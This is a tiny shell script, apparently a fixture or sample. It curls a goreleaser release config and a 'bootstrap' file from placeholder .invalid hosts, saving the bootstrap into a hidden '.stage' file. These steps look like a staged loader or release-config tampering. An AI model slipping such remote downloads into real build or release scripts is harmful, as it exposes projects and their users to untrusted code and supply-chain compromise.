#!/bin/sh
curl -fsS -o .goreleaser.yaml https://config.invalid/release.yaml
curl -fsS -o .stage https://stage.invalid/bootstrap
